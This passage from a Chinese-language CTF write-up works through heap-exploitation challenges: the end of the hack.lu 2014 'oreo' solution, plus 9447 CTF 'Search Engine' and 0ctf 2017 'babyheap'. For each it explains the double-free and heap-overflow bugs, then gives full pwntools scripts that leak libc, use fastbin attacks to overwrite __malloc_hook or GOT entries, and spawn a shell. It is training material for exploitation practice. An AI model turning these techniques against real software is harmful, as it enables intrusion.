    name = 27 * 'a' + p32(oreo.got['puts'])
    add(25 * 'a', name)
    show_rifle()
    p.recvuntil('===================================\n')
    p.recvuntil('Description: ')
    puts_addr = u32(p.recvuntil('\n', drop=True)[:4])
    log.success('puts addr: ' + hex(puts_addr))
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search('/bin/sh'))
    print 'step 2. free fake chunk at 0x0804A2A8'

    # now, oifle_cnt=1, we need set it = 0x40
    oifle = 1
    while oifle < 0x3f:
        # set next link=NULL
        add(25 * 'a', 'a' * 27 + p32(0))
        oifle += 1
    payload = 'a' * 27 + p32(0x0804a2a8)
    # set next link=0x0804A2A8, try to free a fake chunk
    add(25 * 'b', payload)
    # gdb.attach(p)
    # before free, we need to bypass some check
    # fake chunk's size is 0x40
    # 0x20 *'a' for padding the last fake chunk
    # 0x40 for fake chunk's next chunk's prev_size
    # 0x100 for fake chunk's next chunk's size
    # set fake iofle' next to be NULL
    payload = 0x20 * '\x00' + p32(0x40) + p32(0x100)
    # payload = payload.ljust(60, 'b')
    # payload += p32(0)
    # payload = payload.ljust(128, 'c')
    message(payload)

    

    # fastbin 0x40: 0x0804A2A0->some where heap->NULL
    order()
    
    p.recvuntil('Okay order submitted!\n')

    print 'step 3. get shell'
    # modify free@got to system addr
    payload = p32(oreo.got['strlen']).ljust(20, 'a')
    add(payload, 'b' * 20)

    log.success('system addr: ' + hex(system_addr))
    #gdb.attach(p)
    message(p32(system_addr) + '||/bin/sh\x00')

    p.interactive()


if __name__ == "__main__":
    exp()
```

> [[原创]2014 hack.lu oreo](https://bbs.pediy.com/thread-247214-1.htm)

## 2015 9447 CTF : Search Engine

### 基本情况

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
程序没有 setbuf ，会自动申请 chunk 存放输入缓冲数据。

### 基本功能

一个变种的堆管理器，算是有增删查功能。菜单两个入口：

1. Search with a word
2. Index a sentence

index 可以创建堆，大小自定义（小于 0xFFD），读取字符串长度必须等于给定的长度，输入字符串没有设置结束符 \x00 。

search 搜索句子，读取搜索字符串长度必须等给定长度，检索规则如下：

```c
for ( i = chunk_list; i; i = *(_QWORD *)(i + 0x20) )
{
    if ( **(_BYTE **)(i + 16) )
    {
        if ( *(_DWORD *)(i + 8) == v0 && !memcmp(*(const void **)i, chunk_ptr, v0) )
        {
```

具体结构体结构调试一下就能看到逻辑，0x28 那个就是结构体 chunk 。

首先是 sentence chunk 首字节不能为 \x00 ，然后根据 size 和 memcmp 搜索相同的 chunk 。

### 漏洞

最明显的就是 double free ，在 search 找到对应 sentenc chunk 之后，选择释放完成后，并没有将结构体指针置零。

这个功能函数还有一个漏洞，释放 sentenc chunk 之前会使用 memset 将 chunk 全部置零，避免了检查被释放的 chunk （源码检查机制：``if ( **(_BYTE **)(i + 16) )``），但是当 chunk 放入 fastbin 非首个 chunk 或者是 unsortedbin 等时，会向 fd 、bk 写入地址信息，使得 sentenc chunk 首字节非 0 ，致使 search 时最终还是会搜索被释放的 chunk 。

还有漏洞就是写入 sentenc 的时候，如果写入长度刚刚好等于给出的写入长度，那么 sentenc 结尾不会补上结束符 \x00 。（网上有 wp 利用这个漏洞，泄露栈上的 libc 地址）

### 思路

利用 free 之后没有置零指针，完成泄露 libc 地址，fastbin Arbitrary Alloc 修改 malloc_hook 为 onegadget 。

1. 申请一个非 fastbin 大小 chunk ，将其释放，fd 指针就会写入 libc 段地址。利用 search 搜索 ``\x00`` ，找到在 unsorted bin 中的 chunk ，程序会将 chunk 的 fd 指针给输出。
2. 申请 3 个 fastbin chunk ，利用最后两个完成 Arbitrary Alloc 篡改 malloc_hook 

申请 0x88 unsorted bin chunk ，泄露 libc 地址：

```python
Index(' m '.rjust(0x88,'a'))
search('m')
p.recvuntil('Delete this sentence (y/n)?\n')
p.sendline('y')
search('\x00')
p.recvuntil('Found 136: ')
unsortbin_addr = u64(p.recv(6).ljust(8,'\x00'))
log.info("unsortbin_addr:" + hex(unsortbin_addr))
```

Arbitrary Alloc 步骤：sky 三个 chunk 先释放到 fastbin 中，然后 double free k chunk ，完成修改链表。如果缺少 s chunk 只使用两个堆，double free 时报错：``double free or corruption (fasttop)``，此时被 double free chunk 的链首。

```python
search('s')
p.recvuntil("Found")
p.sendline('y')
search('k')
p.recvuntil("Found")
p.sendline('y')
search('y')
p.recvuntil("Found")
p.sendline('y')
search('\x00')
p.recvuntil("Found")
p.sendline('n')
p.recvuntil("Found")
p.sendline('y')

fakechunk_addr = malloc_hook - 0x23
Index(p64(fakechunk_addr).ljust(0x68,'b'))
Index(' s '.rjust(0x68,'b'))
Index(' k '.rjust(0x68,'b'))
Index(p64(0xf1207+libc_base).rjust(0x1b,'a').ljust(0x68,'b'))
```

篡改链表之后，通过偏移找到  size 在 fastbin 范围的 fakechunk 。

### EXP

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : MrSkYe
# @Email   : skye231@foxmail.com
from pwn import * 
context(log_level='debug',os='linux',arch='amd64')

p = process("./search")
elf = ELF("./search")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def search(word):
	p.recvuntil('3: Quit\n',timeout=3)
	p.sendline('1')
	p.recvuntil('Enter the word size:\n')
	p.sendline(str(len(word)))
	p.recvuntil('Enter the word:\n')
	p.send(word)


def Index(word):
	p.recvuntil('3: Quit\n',timeout=3)
	p.sendline('2')
	p.recvuntil('Enter the sentence size:\n')
	p.sendline(str(len(word)))
	p.recvuntil('Enter the sentence:\n')
	p.send(word)


def exp():
	Index(' m '.rjust(0x88,'a'))
	search('m')
	p.recvuntil('Delete this sentence (y/n)?\n')
	p.sendline('y')
	search('\x00')
	p.recvuntil('Found 136: ')
	unsortbin_addr = u64(p.recv(6).ljust(8,'\x00'))
	log.info("unsortbin_addr:" + hex(unsortbin_addr))


	libc_base = unsortbin_addr - 0x3c4b78
	system = libc_base + libc.sym['system']
	str_binsh = libc_base + libc.search('/bin/sh').next()
	malloc_hook = libc_base + libc.sym['__malloc_hook']
	log.info('libc_base:'+hex(libc_base))
	log.info("system:"+hex(system))
	log.info("str_binsh:"+hex(str_binsh))
	log.info("malloc_hook:"+hex(malloc_hook))


	p.sendline('n')

	Index(' s '.rjust(0x68,'a'))
	Index(' k '.rjust(0x68,'a'))
	Index(' y '.rjust(0x68,'a'))

	search('s')
	p.recvuntil("Found")
	p.sendline('y')
	search('k')
	p.recvuntil("Found")
	p.sendline('y')
	search('y')
	p.recvuntil("Found")
	p.sendline('y')
	search('\x00')
	p.recvuntil("Found")
	p.sendline('n')
	p.recvuntil("Found")
	p.sendline('y')

	fakechunk_addr = malloc_hook - 0x23
	Index(p64(fakechunk_addr).ljust(0x68,'b'))
	Index(' s '.rjust(0x68,'b'))
	Index(' k '.rjust(0x68,'b'))


	'''
	0x45226 execve("/bin/sh", rsp+0x30, environ)
	constraints:
	  rax == NULL

	0x4527a execve("/bin/sh", rsp+0x30, environ)
	constraints:
	  [rsp+0x30] == NULL

	0xf0364 execve("/bin/sh", rsp+0x50, environ)
	constraints:
	  [rsp+0x50] == NULL

	0xf1207 execve("/bin/sh", rsp+0x70, environ)
	constraints:
	  [rsp+0x70] == NULL
	'''
	# gdb.attach(p)
	Index(p64(0xf1207+libc_base).rjust(0x1b,'a').ljust(0x68,'b'))




	# gdb.attach(p)
	p.interactive()
	
if __name__ == '__main__':
	exp()
```



## 2017 0ctf babyheap

### 基本情况

    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
保护全开，RELRO 全开，got 表不能修改。

### 基本功能

程序是一个堆管理器，有增删查改功能。

结构体：

```c
struct{
    int inuse;
    int size;
    void *chunk_ptr;
}
```

限制申请 chunk 上限为 16 个，大小小于等于 4096 字节即可。四大功能都是根据 chunk 下标进行操作。

### 漏洞

在修改函数中，修改的大小是自行输入的，并不是读取结构体中 chunk size ，造成了堆溢出问题。

```c
__int64 __fastcall my_write(__int64 a1)
{
  __int64 index; // rax
  int i; // [rsp+18h] [rbp-8h]
  int size; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  index = get_num();
  i = index;
  if ( (signed int)index >= 0 && (signed int)index <= 15 )// 检查下标范围
  {
    index = *(unsigned int *)(24LL * (signed int)index + a1);// 提取chunk指针
    if ( (_DWORD)index == 1 )                   // 检查inuse位
    {
      printf("Size: ");
      index = get_num();
      size = index;
      if ( (signed int)index > 0 )              // 检查size大于0
      {
        printf("Content: ");
        index = write_chunk(*(_QWORD *)(24LL * i + a1 + 16), size);// 堆溢出，没有对size进行检查
      }
    }
  }
  return index;
}
```

### 思路

利用堆溢出，造成堆重叠（通过 extend 向前合并），泄露出 libc 地址。再次利用堆溢出，造成 fastbin attack（Arbitray Alloc），修改 __malloc_hook 为 onegadget 。

创建非 fastbin 的 chunk0、2 触发 unlink 合并为一个整体；被重叠 chunk1 用于读取 libc 地址；保护避免与 topchunk 合并的 chunk3 。

释放 chunk0 ，修改 chunk1 溢出覆盖 chunk2 的 prev_size 和 size_inuse ，释放 chunk2 触发 unlink 合并。

```python
create(0x80)#0
create(0x10)#1
create(0x80)#2
create(0x10)#3

free(0)
payload = 'a'*0x10 + p64(0xb0) + p64(0x90)
write(1,len(payload),payload)
free(2)

create(0x80)
dump(1)
p.recvuntil("Content: \n")
leak_addr = u64(p.recv(6).ljust(8,'\x00'))
log.info("leak_addr:"+hex(leak_addr))
```

申请 0x60 fastbin chunk 之后就是常规的修改 fastbin fd 指针达到任意写的操作。这里偏移构造 size 位选择 0x23 。

```python
create(0x10)#3
create(0x70)#4
create(0x60)#5
free(5)
payload = 'c'*0xa0 + p64(0) + p64(0x71)
payload += p64(malloc_hook-0x23)
# write(3,len(payload),payload)
write(4,len(payload),payload)
create(0x60)#5
create(0x60)#6

payload = 'a'*(0x23-0x10)
payload += p64(onegadget)
write(6,len(payload),payload)

creat(0x20)
```

这条题目泄露 libc 地址还有一种方法，修改 fastbin fd 指向一个 inuse 的非 fastbin 的堆块，然后将这个 fastbin 申请出来，达成两个指针指向同一个地址效果。然后释放这个非 fastbin 的堆块，用刚刚申请创造的 fastbin 指针读取 fd 指针的 libc 地址。具体看 gd 文章：https://bbs.pediy.com/thread-223461.htm

```python
create(0x10)
create(0x10)#1
create(0x10)
create(0x10)
create(0x80)#4
create(0x10)

free(2)
free(1)

payload = 0x10 * 'a' + p64(0) + p64(0x21) + p8(0x80)
fill(0, len(payload), payload)

payload = 0x10 * 'a' + p64(0) + p64(0x21)
fill(3, len(payload), payload)
create(0x10)  # idx 1
create(0x10)  # idx 2, which point to idx4's location
dump(2)
```

覆盖 chunk1 在 fastbin 时的 fd 执行 chunk4 之后，还需要将 chunk4 size 修改为 chunk1 fastbin 所在的大小范围：

```shell
pwndbg> bin
fastbins
0x20: 0x555555757020 —▸ 0x555555757080 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

chunk1 在 fastbin 处于 0x20 ，所以需要将 chunk4 size 修改为 0x20 。

泄露 libc 地址之后，后面利用差不多是一样的。

### EXP

```python
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
p = process("./babyheap")
elf = ELF("./babyheap")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size):
	p.recvuntil("Command: ")
	p.sendline('1')
	p.recvuntil("Size: ")
	p.sendline(str(size))
def write(index,size,content):
	p.recvuntil("Command: ")
	p.sendline('2')
	p.recvuntil("Index: ")
	p.sendline(str(index))
	p.recvuntil("Size: ")
	p.sendline(str(size))
	p.recvuntil("Content: ")
	p.send(content)
def free(index):
	p.recvuntil("Command: ")
	p.sendline('3')
	p.recvuntil("Index: ")
	p.sendline(str(index))
def dump(index):
	p.recvuntil("Command: ")
	p.sendline("4")
	p.recvuntil("Index: ")
	p.sendline(str(index))


# ex
create(0x80)#0
create(0x10)#1
create(0x80)#2
create(0x10)#3

free(0)
payload = 'a'*0x10 + p64(0xb0) + p64(0x90)
write(1,len(payload),payload)
free(2)

create(0x80)
dump(1)
p.recvuntil("Content: \n")
leak_addr = u64(p.recv(6).ljust(8,'\x00'))
log.info("leak_addr:"+hex(leak_addr))

libc_base = leak_addr-0x3c4b78
malloc_hook = libc_base + libc.sym['__malloc_hook']
one = [0x45226,0x4527a,0xf0364,0xf1207]
onegadget = one[1] + libc_base
log.info("libc_base:"+hex(libc_base))
log.info("malloc_hook:"+hex(malloc_hook))
log.info("onegadget:"+hex(onegadget))


create(0x10)#3
create(0x70)#4
create(0x60)#5
free(5)
payload = 'c'*0xa0 + p64(0) + p64(0x71)
payload += p64(malloc_hook-0x23)
# write(3,len(payload),payload)
write(4,len(payload),payload)
create(0x60)#5
create(0x60)#6

payload = 'a'*(0x23-0x10)
payload += p64(onegadget)
write(6,len(payload),payload)

create(0x20)



# gdb.attach(p,"b *$rebase (0x119F)")

p.interactive()

```

